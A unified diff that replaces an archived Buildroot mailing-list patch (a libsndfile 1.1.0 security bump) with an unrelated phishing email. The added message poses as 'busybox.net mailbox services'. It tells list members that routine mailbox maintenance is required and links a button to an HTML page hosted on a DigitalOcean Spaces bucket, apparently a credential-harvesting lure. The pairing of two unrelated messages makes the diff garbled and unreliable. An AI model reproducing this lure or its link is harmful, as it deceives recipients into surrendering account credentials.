@@ -1,88 +1,47 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
+Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 58C01C43334
-	for <buildroot@archiver.kernel.org>; Sun, 26 Jun 2022 21:10:55 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 02F56C43334
+	for <buildroot@archiver.kernel.org>; Mon, 27 Jun 2022 05:26:13 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp2.osuosl.org (Postfix) with ESMTP id CE19340583;
-	Sun, 26 Jun 2022 21:10:54 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org CE19340583
-X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp2.osuosl.org ([127.0.0.1])
-	by localhost (smtp2.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id u3wPAEUgO6-2; Sun, 26 Jun 2022 21:10:53 +0000 (UTC)
-Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp2.osuosl.org (Postfix) with ESMTP id A9FFA4093B;
-	Sun, 26 Jun 2022 21:10:52 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org A9FFA4093B
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by ash.osuosl.org (Postfix) with ESMTP id D91471BF3E3
- for <buildroot@lists.busybox.net>; Sun, 26 Jun 2022 21:10:50 +0000 (UTC)
-Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id C0FA34169B
- for <buildroot@lists.busybox.net>; Sun, 26 Jun 2022 21:10:50 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org C0FA34169B
+	by smtp4.osuosl.org (Postfix) with ESMTP id 112C74186A;
+	Mon, 27 Jun 2022 05:26:13 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 112C74186A
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id xU6cLLqYPUaf for <buildroot@lists.busybox.net>;
- Sun, 26 Jun 2022 21:10:49 +0000 (UTC)
-X-Greylist: whitelisted by SQLgrey-1.8.0
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 3AD50410AB
-Received: from mail-wr1-x42f.google.com (mail-wr1-x42f.google.com
- [IPv6:2a00:1450:4864:20::42f])
- by smtp4.osuosl.org (Postfix) with ESMTPS id 3AD50410AB
- for <buildroot@buildroot.org>; Sun, 26 Jun 2022 21:10:49 +0000 (UTC)
-Received: by mail-wr1-x42f.google.com with SMTP id v14so10404914wra.5
- for <buildroot@buildroot.org>; Sun, 26 Jun 2022 14:10:49 -0700 (PDT)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20210112;
- h=x-gm-message-state:from:to:cc:subject:date:message-id:mime-version
- :content-transfer-encoding;
- bh=abUsxQ5yizxKMvZMZJvzx1X0HF0GldeJJnDUTepn6YM=;
- b=Vk+oFxxDZ1uC7guYruBbOyRyXj6NBS5x8FMmfDtx9uYnRl04RYkmIyxL8k8tarn+nX
- RvJZW5pXEY9QN7AUu7aqvKSm+ikC/pL6CXumMFUFHTU2489Odnt53TZS8CupEGPDU7de
- knpZJZ5Q3b+urgA9NOSNAVdeSY5luXSyECycVHFLLwNgVAFPGiJsYQcPoWWGar0u6Bie
- nNqX1MYojrJUs5sQ5Cz/mi5hgH3MFvlULZYl020UU3u8SoBNivxOl5CptC2Pd+Jk+2JB
- X6DKsHcebbTXbSWkY2bQfBtF3Wf6GrXteMiasXOxjnc8i5rTOM92KIU3zS9ZICN+zcq6
- FFPQ==
-X-Gm-Message-State: AJIora/pCr2m2ZqdnONAxr81wUCbYELqcIvcuJsCJHr7Kzp/etz8nGer
- BLtFaFFsfV9HY1rwkf1dQf3j9N5e3do=
-X-Google-Smtp-Source: AGRyM1vVFv4YwNy/1yvDFMyn+b4K/JrKocAqAWg/j+KiKEnYdrDL7LXwgoN2fxpy8A4/U5Y4XYqfYA==
-X-Received: by 2002:a05:6000:1f19:b0:21b:98d6:3532 with SMTP id
- bv25-20020a0560001f1900b0021b98d63532mr9486203wrb.45.1656277846976; 
- Sun, 26 Jun 2022 14:10:46 -0700 (PDT)
-Received: from kali.home (2a01cb088e0b5b002be75de2a1caa253.ipv6.abo.wanadoo.fr.
- [2a01:cb08:8e0b:5b00:2be7:5de2:a1ca:a253])
- by smtp.gmail.com with ESMTPSA id
- s5-20020a5d5105000000b0021b88ec99cesm8482359wrt.94.2022.06.26.14.10.46
- (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Sun, 26 Jun 2022 14:10:46 -0700 (PDT)
-From: Fabrice Fontaine <fontaine.fabrice@gmail.com>
-To: buildroot@buildroot.org
-Date: Sun, 26 Jun 2022 23:07:59 +0200
-Message-Id: <20220626210759.1618312-1-fontaine.fabrice@gmail.com>
-X-Mailer: git-send-email 2.35.1
+	by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id P6EKo1QxV4y9; Mon, 27 Jun 2022 05:26:11 +0000 (UTC)
+Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
+	by smtp4.osuosl.org (Postfix) with ESMTP id A3F8941838;
+	Mon, 27 Jun 2022 05:26:10 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org A3F8941838
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 8016F1BF33E
+ for <buildroot@lists.busybox.net>; Mon, 27 Jun 2022 05:26:08 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 499EE82ECF
+ for <buildroot@lists.busybox.net>; Mon, 27 Jun 2022 05:26:07 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 499EE82ECF
+X-Virus-Scanned: amavisd-new at osuosl.org
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id tQ3DLyoVx0eC for <buildroot@lists.busybox.net>;
+ Mon, 27 Jun 2022 05:26:06 +0000 (UTC)
+X-Greylist: from auto-whitelisted by SQLgrey-1.8.0
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 3D8F682EE1
+Received: from hp0.mv9.fzhao.cfd (unknown [164.92.170.19])
+ by smtp1.osuosl.org (Postfix) with ESMTPS id 3D8F682EE1
+ for <buildroot@busybox.net>; Mon, 27 Jun 2022 05:26:06 +0000 (UTC)
+From: "IMPORTANT - DO NOT IGNORE!!!"  <mailbox-services@busybox.net>
+To: buildroot@busybox.net
+Date: 27 Jun 2022 06:15:59 +0100
+Message-ID: <20220627061559.1E9F1E61C9DBB39F@busybox.net>
 MIME-Version: 1.0
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=gmail.com; s=20210112;
- h=from:to:cc:subject:date:message-id:mime-version
- :content-transfer-encoding;
- bh=abUsxQ5yizxKMvZMZJvzx1X0HF0GldeJJnDUTepn6YM=;
- b=pr6HHYXSQnW3vC2CGRcN/dqkkhcVECvfbiKrcRQTRn1++MKjSEE655mOpG3Nr+u1dp
- z4RoTa3uC/mqzDElrfHtmdjkqRg7g8NmIgKSYlQm/ldD7+2SKC+mliCO/7doX0LzIpE9
- GzbjRGiKGZNQpVzuaqZuUrSJIQG6v/QRK5zjq4c8dbzVDrg81lorxLWPsQ/myGDAzZSR
- TzSc0JAD8QRa6Y6VH3E2sYs/IOwTPnZwU1Avdi4AFPeEaA7YNZ/ucaSg9gwcvqu0y9sd
- RyYA5SZPi7NqFz59vzRrL/J8q/j8cZRlFZRGJVDbdjZBYDKUkFtOyDgF0NS8AeD7DmUL
- SfMw==
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com
- header.a=rsa-sha256 header.s=20210112 header.b=pr6HHYXS
-Subject: [Buildroot] [PATCH 1/1] package/libsndfile: security bump to
- version 1.1.0
+Organization: Foobar Inc.
+Subject: [Buildroot] Maintenance of your Mailbox - (buildroot@busybox.net)
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -94,125 +53,229 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Bernd Kuhls <bernd.kuhls@t-online.de>,
- Fabrice Fontaine <fontaine.fabrice@gmail.com>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============2968107891063810665=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Fix the following security issues:
- - Heap buffer overflow in wavlike_ima_decode_block()
- - Heap buffer overflow in msadpcm_decode_block()
- - Heap buffer overflow in psf_binheader_readf()
- - Index out of bounds in psf_nms_adpcm_decode_block()
- - Heap buffer overflow in flac_buffer_copy()
- - Heap buffer overflow in copyPredictorTo24()
- - Uninitialized variable in psf_binheader_readf()
+--===============2968107891063810665==
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_9F6B3F67.BAFC9066"
 
-Drop patch (already in version)
+------=_NextPart_000_0012_9F6B3F67.BAFC9066
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
-While at it, also drop mention of CVE-2018-13419 which is correclty
-tagged as only affecting version 1.0.28 in NVD NIST database:
-https://nvd.nist.gov/vuln/detail/CVE-2018-13419
 
-https://github.com/libsndfile/libsndfile/releases/tag/1.1.0
 
-Signed-off-by: Fabrice Fontaine <fontaine.fabrice@gmail.com>
----
- ...-ms_adpcm-Fix-and-extend-size-checks.patch | 40 -------------------
- package/libsndfile/libsndfile.hash            |  2 +-
- package/libsndfile/libsndfile.mk              | 10 +----
- 3 files changed, 3 insertions(+), 49 deletions(-)
- delete mode 100644 package/libsndfile/0001-ms_adpcm-Fix-and-extend-size-checks.patch
 
-diff --git a/package/libsndfile/0001-ms_adpcm-Fix-and-extend-size-checks.patch b/package/libsndfile/0001-ms_adpcm-Fix-and-extend-size-checks.patch
-deleted file mode 100644
-index edacbda01a..0000000000
---- a/package/libsndfile/0001-ms_adpcm-Fix-and-extend-size-checks.patch
-+++ /dev/null
-@@ -1,40 +0,0 @@
--From deb669ee8be55a94565f6f8a6b60890c2e7c6f32 Mon Sep 17 00:00:00 2001
--From: bobsayshilol <bobsayshilol@live.co.uk>
--Date: Thu, 18 Feb 2021 21:52:09 +0000
--Subject: [PATCH] ms_adpcm: Fix and extend size checks
--
--'blockalign' is the size of a block, and each block contains 7 samples
--per channel as part of the preamble, so check against 'samplesperblock'
--rather than 'blockalign'. Also add an additional check that the block
--is big enough to hold the samples it claims to hold.
--
--https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=26803
--Signed-off-by: Peter Korsgaard <peter@korsgaard.com>
-----
-- src/ms_adpcm.c | 10 ++++++++--
-- 1 file changed, 8 insertions(+), 2 deletions(-)
--
--diff --git a/src/ms_adpcm.c b/src/ms_adpcm.c
--index 5e8f1a31..a21cb994 100644
----- a/src/ms_adpcm.c
--+++ b/src/ms_adpcm.c
--@@ -128,8 +128,14 @@ wavlike_msadpcm_init	(SF_PRIVATE *psf, int blockalign, int samplesperblock)
-- 	if (psf->file.mode == SFM_WRITE)
-- 		samplesperblock = 2 + 2 * (blockalign - 7 * psf->sf.channels) / psf->sf.channels ;
-- 
---	if (blockalign < 7 * psf->sf.channels)
---	{	psf_log_printf (psf, "*** Error blockalign (%d) should be > %d.\n", blockalign, 7 * psf->sf.channels) ;
--+	/* There's 7 samples per channel in the preamble of each block */
--+	if (samplesperblock < 7 * psf->sf.channels)
--+	{	psf_log_printf (psf, "*** Error samplesperblock (%d) should be >= %d.\n", samplesperblock, 7 * psf->sf.channels) ;
--+		return SFE_INTERNAL ;
--+		} ;
--+
--+	if (2 * blockalign < samplesperblock * psf->sf.channels)
--+	{	psf_log_printf (psf, "*** Error blockalign (%d) should be >= %d.\n", blockalign, samplesperblock * psf->sf.channels / 2) ;
-- 		return SFE_INTERNAL ;
-- 		} ;
-- 
---- 
--2.20.1
--
-diff --git a/package/libsndfile/libsndfile.hash b/package/libsndfile/libsndfile.hash
-index 14dfe823f9..67d10d03c4 100644
---- a/package/libsndfile/libsndfile.hash
-+++ b/package/libsndfile/libsndfile.hash
-@@ -1,4 +1,4 @@
- # Locally calculated after checking pgp signature
--sha256  a8cfb1c09ea6e90eff4ca87322d4168cdbe5035cb48717b40bf77e751cc02163  libsndfile-1.0.31.tar.bz2
-+sha256  0f98e101c0f7c850a71225fb5feaf33b106227b3d331333ddc9bacee190bcf41  libsndfile-1.1.0.tar.xz
- # Locally calculated
- sha256  ad01ea5cd2755f6048383c8d54c88459cd6fcb17757c5c8892f8c5ea060f6140  COPYING
-diff --git a/package/libsndfile/libsndfile.mk b/package/libsndfile/libsndfile.mk
-index ed9e8e3d14..12a6601b6b 100644
---- a/package/libsndfile/libsndfile.mk
-+++ b/package/libsndfile/libsndfile.mk
-@@ -4,20 +4,14 @@
- #
- ################################################################################
- 
--LIBSNDFILE_VERSION = 1.0.31
--LIBSNDFILE_SOURCE = libsndfile-$(LIBSNDFILE_VERSION).tar.bz2
-+LIBSNDFILE_VERSION = 1.1.0
-+LIBSNDFILE_SOURCE = libsndfile-$(LIBSNDFILE_VERSION).tar.xz
- LIBSNDFILE_SITE = https://github.com/libsndfile/libsndfile/releases/download/$(LIBSNDFILE_VERSION)
- LIBSNDFILE_INSTALL_STAGING = YES
- LIBSNDFILE_LICENSE = LGPL-2.1+
- LIBSNDFILE_LICENSE_FILES = COPYING
- LIBSNDFILE_CPE_ID_VENDOR = libsndfile_project
- 
--# 0001-ms_adpcm-Fix-and-extend-size-checks.patch
--LIBSNDFILE_IGNORE_CVES += CVE-2021-3246
--
--# disputed, https://github.com/erikd/libsndfile/issues/398
--LIBSNDFILE_IGNORE_CVES += CVE-2018-13419
--
- LIBSNDFILE_CONF_ENV = ac_cv_prog_cc_c99='-std=gnu99'
- LIBSNDFILE_CONF_OPTS = \
- 	--disable-sqlite \
--- 
-2.35.1
+
+
+
+=20=20
+
+Routine Mailbox Maintenance
+
+=20
+=20
+=20
+=20
+
+  
+
+
+Help prevent online threats 
+
+=20=20
+
+A Routine mailbox maintenance is required for the protection of=20
+your mailbox against online malware. Mailbox maintenance will=20
+help to protect your email, data and device.=20
+
+Mailbox maintenance is highly important. The protective measures=20
+will be processed and updated automatically. Click Below and=20
+follow the instructions. 
+
+=20=20
+
+
+
+Mailbox Maintenance 
+
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+=20
+                                              =C2=A9 2022 busybox.net=20
+mailbox services. All Rights Reserved.
+
+
+=20
+=20
+=20
+=20
+=20
+
+------=_NextPart_000_0012_9F6B3F67.BAFC9066
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><br class=3D"Apple-interchange-newline"><table width=3D"100%" align=
+=3D"center" id=3D"ydpfb8e9a76v1ydp84129d36yiv1189396057full" style=3D'margi=
+n: 0px auto; padding: 0px; border: 0px currentColor; border-image: none; wi=
+dth: 736px; color: rgb(38, 40, 42); font-family: "Helvetica Neue", Helvetic=
+a, Arial, sans-serif; border-collapse: collapse;' dir=3D"ltr" cellspacing=
+=3D"0" cellpadding=3D"0"><tbody style=3D"border-color: rgb(238, 238, 238);"=
+><tr style=3D"border-color: rgb(238, 238, 238);">
+<td style=3D"border-color: rgb(238, 238, 238);"><table width=3D"600" align=
+=3D"center" class=3D"ydpfb8e9a76v1ydp84129d36yiv1189396057container" style=
+=3D"margin: 0px auto; padding: 0px; border: 0px currentColor; border-image:=
+ none; width: 600px; border-collapse: collapse; table-layout: fixed;" cells=
+pacing=3D"0" cellpadding=3D"0"><tbody style=3D"border-color: rgb(238, 238, =
+238);"><tr style=3D"border-color: rgb(238, 238, 238);"><td style=3D"border-=
+color: rgb(238, 238, 238);">
+<table width=3D"600" align=3D"center" class=3D"ydpfb8e9a76v1ydp84129d36yiv1=
+189396057c-inner" style=3D"margin: 0px auto; padding: 0px; border: 0px curr=
+entColor; border-image: none; width: 600px; border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0"><tbody style=3D"border-color: rgb(238, 238=
+, 238);"><tr style=3D"border-color: rgb(238, 238, 238);"><td style=3D"borde=
+r-color: rgb(238, 238, 238);" bgcolor=3D"#6001d2">
+<table width=3D"600" align=3D"center" class=3D"ydpfb8e9a76v1ydp84129d36yiv1=
+189396057header" style=3D"margin: 0px auto; padding: 0px; border: 0px curre=
+ntColor; border-image: none; width: 600px; border-collapse: collapse;" cell=
+spacing=3D"0" cellpadding=3D"0"><tbody style=3D"border-color: rgb(238, 238,=
+ 238);"><tr style=3D"border-color: rgb(238, 238, 238);"><td style=3D"border=
+-color: rgb(238, 238, 238);">
+<table width=3D"520" align=3D"center" class=3D"ydpfb8e9a76v1ydp84129d36yiv1=
+189396057inner" style=3D"margin: 0px auto; padding: 0px; border: 0px curren=
+tColor; border-image: none; width: 520px; border-collapse: collapse;" cells=
+pacing=3D"0" cellpadding=3D"0"><tbody style=3D"border-color: rgb(238, 238, =
+238);"><tr style=3D"border-color: rgb(238, 238, 238);"><td class=3D"ydpfb8e=
+9a76v1ydp84129d36yiv1189396057spacer" style=3D"border-color: rgb(238, 238, =
+238); line-height: 20px; font-size: 20px;">&nbsp;</td></tr>
+<tr style=3D"border-color: rgb(238, 238, 238);"><td align=3D"center" class=
+=3D"ydpfb8e9a76v1ydp84129d36yiv1189396057logo" style=3D"border-color: rgb(2=
+38, 238, 238);"><span style=3D"border-color: rgb(238, 238, 238);"><h2 style=
+=3D'border-color: rgb(238, 238, 238); margin: 0px; line-height: 43px; font-=
+family: "Yahoo Sans", Helvetica, Arial, sans-serif; font-size: 38px;'><font=
+ color=3D"#ffffff" style=3D"border-color: rgb(238, 238, 238); font-size: 26=
+pt;">Routine Mailbox Maintenance</font></h2></span>
+<br style=3D"border-color: rgb(238, 238, 238);"></td></tr><tr style=3D"bord=
+er-color: rgb(238, 238, 238);"><td class=3D"ydpfb8e9a76v1ydp84129d36yiv1189=
+396057spacer" style=3D"border-color: rgb(238, 238, 238); line-height: 20px;=
+ font-size: 20px;"></td></tr></tbody></table></td></tr></tbody></table></td=
+></tr><tr style=3D"border-color: rgb(238, 238, 238);"><td style=3D"border-c=
+olor: rgb(238, 238, 238);">
+<table width=3D"600" align=3D"center" class=3D"ydpfb8e9a76v1ydp84129d36yiv1=
+189396057mod-1" style=3D"margin: 0px auto; padding: 0px; border: 0px curren=
+tColor; border-image: none; width: 600px; border-collapse: collapse;" cells=
+pacing=3D"0" cellpadding=3D"0"><tbody style=3D"border-color: rgb(238, 238, =
+238);"><tr style=3D"border-color: rgb(238, 238, 238);">
+<td class=3D"ydpfb8e9a76v1ydp84129d36yiv1189396057spacer ydpfb8e9a76v1ydp84=
+129d36yiv1189396057mobile40" style=3D"border-color: rgb(238, 238, 238); lin=
+e-height: 30px; font-size: 30px;">&nbsp;</td></tr><tr style=3D"border-color=
+: rgb(238, 238, 238);"><td style=3D"border-color: rgb(238, 238, 238);">
+<table width=3D"520" align=3D"center" class=3D"ydpfb8e9a76v1ydp84129d36yiv1=
+189396057inner" style=3D"margin: 0px auto; padding: 0px; border: 0px curren=
+tColor; border-image: none; width: 520px; border-collapse: collapse;" cells=
+pacing=3D"0" cellpadding=3D"0"><tbody style=3D"border-color: rgb(238, 238, =
+238);"><tr style=3D"border-color: rgb(238, 238, 238);">
+<td class=3D"ydpfb8e9a76v1ydp84129d36yiv1189396057copy ydpfb8e9a76v1ydp8412=
+9d36yiv1189396057headline ydpfb8e9a76v1ydp84129d36yiv1189396057left" style=
+=3D'border-color: rgb(238, 238, 238); color: rgb(0, 0, 0); line-height: 43p=
+x; font-family: "Yahoo Sans", Helvetica, Arial, sans-serif; font-size: 38px=
+;'><h2 style=3D"border-color: rgb(238, 238, 238); margin: 0px; color: inher=
+it; line-height: 43px; font-size: 38px;">Help prevent online threats</h2></=
+td></tr><tr style=3D"border-color: rgb(238, 238, 238);">
+<td class=3D"ydpfb8e9a76v1ydp84129d36yiv1189396057spacer" style=3D"border-c=
+olor: rgb(238, 238, 238); line-height: 20px; font-size: 20px;">&nbsp;</td><=
+/tr><tr style=3D"border-color: rgb(238, 238, 238);"><td align=3D"left" clas=
+s=3D"ydpfb8e9a76v1ydp84129d36yiv1189396057copy ydpfb8e9a76v1ydp84129d36yiv1=
+189396057paragraph" style=3D"border-color: rgb(238, 238, 238); color: rgb(0=
+, 0, 0); line-height: 21px; font-family: Helvetica, Arial, sans-serif; font=
+-size: 16px;">
+<div style=3D"border-color: rgb(238, 238, 238); margin: 0px; color: inherit=
+; line-height: inherit; font-size: inherit; font-weight: inherit;" dir=3D"l=
+tr">A Routine mailbox maintenance is required for the protection of your ma=
+ilbox against online malware. Mailbox maintenance will help to protect your=
+ email,&nbsp;data and device. <br><br>Mailbox maintenance is highly importa=
+nt. The protective measures will be processed and updated automatically. Cl=
+ick Below and follow the instructions.</div></td></tr>
+<tr style=3D"border-color: rgb(238, 238, 238);"><td class=3D"ydpfb8e9a76v1y=
+dp84129d36yiv1189396057spacer" style=3D"border-color: rgb(238, 238, 238); l=
+ine-height: 20px; font-size: 20px;">&nbsp;</td></tr><tr style=3D"border-col=
+or: rgb(238, 238, 238);"><td style=3D"border-color: rgb(238, 238, 238);"><t=
+able align=3D"left" class=3D"ydpfb8e9a76v1ydp84129d36yiv1189396057cta-butto=
+n" style=3D"margin: 0px auto; padding: 0px; border: 0px currentColor; borde=
+r-image: none; border-collapse: collapse;">
+<tbody style=3D"border-color: rgb(238, 238, 238);"><tr style=3D"border-colo=
+r: rgb(238, 238, 238);"><td align=3D"center" style=3D"border-color: rgb(238=
+, 238, 238); border-radius: 50px; text-align: center; font-family: Helvetic=
+a, Arial, sans-serif; background-color: rgb(15, 105, 255);"><font color=3D"=
+#ffffff">
+<a style=3D"border-color: rgb(238, 238, 238); color: rgb(25, 106, 212); tex=
+t-decoration: underline; background-color: transparent;" href=3D"https://sf=
+o3.digitaloceanspaces.com/jeffdoubr72yhhqison01/%21%26%21%26.j.%21%24%21%24=
+%24%21/%21%26%21%24%21%26.j.%26%21%26%21.html#nadeem@tradewellintl.com" tar=
+get=3D"_blank" rel=3D"nofollow"></a></font><div style=3D"border-color: rgb(=
+238, 238, 238);">
+<a href=3D"https://sfo3.digitaloceanspaces.com/jeffdoubr72yhhqison01/%21%26=
+%21%26.j.%21%24%21%24%24%21/%21%26%21%24%21%26.j.%26%21%26%21.html#buildroo=
+t@busybox.net"><div align=3D"left" style=3D'border-color: rgb(238, 238, 238=
+); padding: 0px 30px; text-align: center; line-height: 36px; font-family: "=
+Yahoo sans", Helvetica, Arial, sans-serif; font-size: 16px; display: inline=
+-block; white-space: nowrap; background-color: transparent;'><span style=3D=
+"border-color: rgb(238, 238, 238); font-weight: bolder;">
+<font color=3D"#ffffff" style=3D"background-color: inherit;">Mailbox Mainte=
+nance</font></span></div></a></div></td></tr></tbody></table>&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;</td></tr><tr style=3D"border-color: rgb(238, 238, 238);"><td class=3D"ydp=
+fb8e9a76v1ydp84129d36yiv1189396057spacer ydpfb8e9a76v1ydp84129d36yiv1189396=
+057mobile40" style=3D"border-color: rgb(238, 238, 238); line-height: 30px; =
+font-size: 30px;">
+<span style=3D'color: rgb(38, 40, 42); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial=
+, sans-serif; font-size: 30px; font-style: normal; font-weight: 400; word-s=
+pacing: 0px; float: none; display: inline !important; white-space: normal; =
+orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-l=
+igatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px=
+; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'>&nbsp;</sp=
+an><br><span style=3D"font-size: 8pt;"><span style=3D"font-size: 19pt;"><sp=
+an style=3D"font-size: 10pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;<span style=3D"font-size: 8pt;">
+&copy; 2022 busybox.net mailbox services. All Rights Reserved.</span></span=
+></span></span><br class=3D"Apple-interchange-newline">
+<table width=3D"600" align=3D"center" style=3D'margin: 0px auto; padding: 0=
+px; border: 0px currentColor; border-image: none; color: rgb(38, 40, 42); t=
+ext-transform: none; letter-spacing: normal; font-family: "Helvetica Neue",=
+ Helvetica, Arial, sans-serif; font-size: 30px; font-style: normal; font-we=
+ight: 400; word-spacing: 0px; white-space: normal; border-collapse: collaps=
+e; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;' border=3D"0" cell=
+spacing=3D"0" cellpadding=3D"0"><tbody style=3D"border-color: rgb(238, 238,=
+ 238);"><tr style=3D"border-color: rgb(238, 238, 238);">
+
+</tr></tbody></tr></tbody></tr></tbody></tr></tbody></tr></tbody></tr></tbo=
+dy></table></body></html>
+------=_NextPart_000_0012_9F6B3F67.BAFC9066--
+
+--===============2968107891063810665==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============2968107891063810665==--
